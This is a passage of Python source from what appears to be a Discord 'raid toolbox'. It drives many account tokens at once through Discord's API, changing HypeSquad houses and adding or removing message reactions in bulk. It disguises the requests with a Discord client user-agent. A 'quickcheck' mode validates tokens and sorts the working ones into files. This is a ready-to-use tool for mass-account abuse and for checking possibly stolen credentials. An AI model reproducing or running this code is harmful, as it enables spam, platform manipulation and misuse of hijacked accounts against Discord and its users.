            payload = {'house_id': 3}
        requests.post('https://discordapp.com/api/v6/hypesquad/online',headers=headers,json=payload)
    if climode == 0:
        layout = [
                 [sg.Text('House To Change to', size=(15, 1)),sg.Combo(['Bravery','Brilliance','Ballance'],readonly=True, default_value='Bravery')],
                 [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
                ]
        window = sg.Window('RTB | HypeSquad House Changer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        house = values[0]
    else:
        house = sys.argv[5]
    for token in tokenlist:
        executor.submit(changehouse,token,house)

elif mode == "reaction":
    import emoji
    def addreact(token,emoji,message,channel,type):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if type == "Add":
            requests.put("https://discordapp.com/api/v6/channels/{}/messages/{}/reactions/{}/@me".format(channel,message,emoji), headers=headers)
        elif type == "Remove":
            requests.delete("https://discordapp.com/api/v6/channels/{}/messages/{}/reactions/{}/@me".format(channel,message,emoji), headers=headers)
    if climode == 0:
        layout = [
                [sg.Text('Channel ID', size=(15, 1)), sg.InputText()],
                [sg.Text('Message ID', size=(15, 1)), sg.InputText()],
                [sg.Combo(['Add','Remove'],default_value='Add',readonly=True,size=(14,1)), sg.InputText(":thumbsup:",size=(10,1))],
                [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
                ]
        window = sg.Window('RTB | Message Reactor', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        channel = values[0]
        message = values[1]
        type = values[2]
        emoji = emoji.emojize(values[3].rstrip(), use_aliases=True)
    else:
        message = sys.argv[5]
        channel = sys.argv[6]
        type = sys.argv[7]
        emoji = emoji.emojize(sys.argv[8].rstrip(), use_aliases=True)
    for token in tokenlist:
        executor.submit(addreact,token,emoji,message,channel,type)

elif mode == 'quickcheck':
    from colorama import init
    from termcolor import colored
    init()
    token = sys.argv[5]
    apilink = 'https://discordapp.com/api/v6/users/@me'
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    src = requests.get(apilink, headers=headers)
    if "401: Unauthorized" in str(src.content):
        print(colored(token + " Invalid","red"))
    else:
        response = json.loads(src.content.decode())
        if response["verified"]:
            print(colored(token + " Valid","green"))
            with open ("quick_checked_tokens_verified.txt", "a+") as handle:
                handle.write(token+"\n")
        else:
            print(colored(token + " Unverified","yellow"))
            with open ("quick_checked_tokens_unverified.txt", "a+") as handle:
                handle.write(token+"\n")
